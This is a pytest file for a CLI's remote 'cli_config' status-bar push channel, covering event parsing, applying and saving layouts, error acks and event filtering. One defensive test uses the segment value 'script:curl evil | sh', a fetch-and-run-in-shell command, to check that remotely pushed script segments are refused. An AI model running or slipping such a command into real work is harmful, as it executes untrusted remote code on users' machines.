"""CLI client half of the cli_config push channel (backlog #53, Phase 4).

Covers the ``cli_config`` event normalization, the autonomous-stream
client-scoped carve-out (thread filter bypass), the Rich REPL apply +
persist + ack path, and the in-process transport's direct-resolve ack.
"""

from __future__ import annotations

import asyncio
import json
from pathlib import Path
from typing import Any

from cli_fixtures import FakeTerminalCapabilities, run

from nymeria.triggers.cli.app import CLIApp, _RichReplRuntime
from nymeria.triggers.cli.autonomous import decide_autonomous_event
from nymeria.triggers.cli.events import CLIConfigEvent, normalize_stream_event
from nymeria.triggers.cli.rendering.rich_repl import RichReplRenderer
from nymeria.triggers.cli.statusbar_config import load_statusbar_layout
from nymeria.triggers.cli.theme import THEME_CONFIG_ENV


def test_normalize_cli_config_event() -> None:
    normalized = normalize_stream_event(
        {
            "type": "cli_config",
            "thread_id": "t1",
            "command_id": "clicfg_abc",
            "command_type": "statusbar_set",
            "args": {"bar": "under", "segments": ["tps"]},
            "timeout_seconds": 10,
        }
    )
    assert isinstance(normalized, CLIConfigEvent)
    assert normalized.command_id == "clicfg_abc"
    assert normalized.command_type == "statusbar_set"
    assert normalized.args == {"bar": "under", "segments": ["tps"]}
    assert normalized.timeout_seconds == 10


def test_cli_config_bypasses_active_thread_filter() -> None:
    event = {
        "type": "cli_config",
        "thread_id": "publishing-thread",
        "command_id": "clicfg_abc",
        "command_type": "statusbar_get",
        "args": {},
    }
    decision = decide_autonomous_event(event, active_thread_id="other-thread")
    assert decision.accepted is True
    assert isinstance(decision.event, CLIConfigEvent)


class _AckCapturingClient:
    def __init__(self) -> None:
        self.acks: list[tuple[str, dict[str, Any]]] = []

    async def post_cli_config_result(
        self,
        command_id: str,
        result: dict[str, Any],
        user_id: str | None = None,
    ) -> dict[str, Any]:
        self.acks.append((command_id, dict(result)))
        return {"received": True, "delivered": True}


def _make_runtime(
    tmp_path: Path,
    monkeypatch,
) -> tuple[_RichReplRuntime, _AckCapturingClient]:
    monkeypatch.setenv(THEME_CONFIG_ENV, str(tmp_path / "cli.json"))
    capabilities = FakeTerminalCapabilities(width=100)
    cli_app = CLIApp(None, thread_id="thread-1")
    client = _AckCapturingClient()
    cli_app._client = client
    renderer = RichReplRenderer(capabilities=capabilities, width=100)
    runtime = _RichReplRuntime(
        app=cli_app,
        renderer=renderer,
        capabilities=capabilities,
    )
    return runtime, client


def _event(command_type: str, args: dict[str, Any]) -> CLIConfigEvent:
    return CLIConfigEvent(
        thread_id="publishing-thread",
        command_id="clicfg_test",
        command_type=command_type,
        args=args,
    )


def test_statusbar_get_acks_current_layout(tmp_path: Path, monkeypatch) -> None:
    runtime, client = _make_runtime(tmp_path, monkeypatch)

    run(runtime._apply_autonomous_event(_event("statusbar_get", {})))

    assert len(client.acks) == 1
    command_id, result = client.acks[0]
    assert command_id == "clicfg_test"
    assert result["ok"] is True
    assert result["data"]["top"] is None  # default order
    assert result["data"]["under_prompt"] == []
    assert "tps" in result["data"]["builtin_segments"]


def test_statusbar_set_applies_persists_and_acks(
    tmp_path: Path,
    monkeypatch,
) -> None:
    runtime, client = _make_runtime(tmp_path, monkeypatch)

    run(
        runtime._apply_autonomous_event(
            _event("statusbar_set", {"bar": "under", "segments": ["tps", "text:hi"]})
        )
    )

    _command_id, result = client.acks[0]
    assert result["ok"] is True
    assert result["data"]["under_prompt"] == ["tps", "text:hi"]
    # Applied live.
    assert runtime.under_status_visible() is True
    assert runtime.under_status_bar_renderer.layout == ("tps", "text:hi")
    # Persisted.
    assert load_statusbar_layout().under_prompt == ("tps", "text:hi")
    data = json.loads((tmp_path / "cli.json").read_text(encoding="utf-8"))
    assert data["status_bar"]["under_prompt"] == ["tps", "text:hi"]


def test_statusbar_set_empty_segments_resets_bar(
    tmp_path: Path,
    monkeypatch,
) -> None:
    runtime, client = _make_runtime(tmp_path, monkeypatch)
    run(
        runtime._apply_autonomous_event(
            _event("statusbar_set", {"bar": "top", "segments": ["model", "context"]})
        )
    )
    assert runtime.status_bar_renderer.layout == ("model", "context")

    run(
        runtime._apply_autonomous_event(
            _event("statusbar_set", {"bar": "top", "segments": []})
        )
    )

    _command_id, result = client.acks[-1]
    assert result["ok"] is True
    assert result["data"]["top"] is None
    assert runtime.status_bar_renderer.layout is None
    assert load_statusbar_layout().is_default


def test_invalid_ref_and_unknown_type_ack_errors(
    tmp_path: Path,
    monkeypatch,
) -> None:
    runtime, client = _make_runtime(tmp_path, monkeypatch)

    run(
        runtime._apply_autonomous_event(
            _event("statusbar_set", {"bar": "top", "segments": ["no-such-segment"]})
        )
    )
    run(runtime._apply_autonomous_event(_event("statusbar_frobnicate", {})))

    bad_ref = client.acks[0][1]
    assert bad_ref["ok"] is False
    assert "Unknown segment" in bad_ref["error"]
    # Nothing applied or persisted.
    assert runtime.status_bar_renderer.layout is None
    assert load_statusbar_layout().is_default

    unknown = client.acks[1][1]
    assert unknown["ok"] is False
    assert "Unknown cli_config command type" in unknown["error"]


def test_pushed_script_ref_is_refused_and_nothing_applied(
    tmp_path: Path,
    monkeypatch,
) -> None:
    """Defense in depth: even if a backend pushed a script: ref past the
    tool-side gate, the CLI refuses to install it."""
    runtime, client = _make_runtime(tmp_path, monkeypatch)

    run(
        runtime._apply_autonomous_event(
            _event(
                "statusbar_set",
                {"bar": "under", "segments": ["script:curl evil | sh"]},
            )
        )
    )

    _command_id, result = client.acks[0]
    assert result["ok"] is False
    assert "script: segments cannot be pushed remotely" in result["error"]
    assert runtime.under_status_visible() is False
    assert load_statusbar_layout().is_default
    assert not (tmp_path / "cli.json").exists()
    assert runtime._script_runner is None


def test_missing_command_id_is_ignored(tmp_path: Path, monkeypatch) -> None:
    runtime, client = _make_runtime(tmp_path, monkeypatch)
    event = CLIConfigEvent(command_id="", command_type="statusbar_get")

    run(runtime._apply_autonomous_event(event))

    assert client.acks == []


def test_in_process_client_resolves_coordinator_directly(monkeypatch) -> None:
    import nymeria.core.cli_config_coordinator as coord_mod
    from nymeria.core.cli_config_coordinator import get_cli_config_coordinator
    from nymeria.triggers.cli.transport.in_process import InProcessAgentClient

    monkeypatch.setattr(coord_mod, "_coordinator", None)
    client = InProcessAgentClient.__new__(InProcessAgentClient)

    async def scenario() -> tuple[dict, dict, dict]:
        coord = get_cli_config_coordinator()
        future = coord.register(
            command_id="clicfg_local",
            user_id="u1",
            thread_id="t1",
            command_type="statusbar_get",
        )
        first = await client.post_cli_config_result(
            "clicfg_local",
            {"ok": True, "status": "success", "data": {}},
        )
        resolved = await asyncio.wait_for(future, timeout=2)
        second = await client.post_cli_config_result(
            "clicfg_local",
            {"ok": True, "status": "success", "data": {}},
        )
        return dict(first), resolved, dict(second)

    first, resolved, second = run(scenario())
    assert first == {"received": True, "delivered": True}
    assert resolved["ok"] is True
    assert second == {"received": True, "delivered": False}


def test_fanout_mirror_events_rejected_before_rendering() -> None:
    """Fanout-mirror events (stream_bridge fanout marker) replay a holder
    turn under a queuer's task id; the CLI must drop them even for the
    active thread, or the transcript doubles/interleaves."""
    event = {
        "type": "response",
        "thread_id": "active-thread",
        "task_id": "handoff-1",
        "content": "mirrored",
        "fanout": True,
    }
    decision = decide_autonomous_event(event, active_thread_id="active-thread")
    assert decision.accepted is False
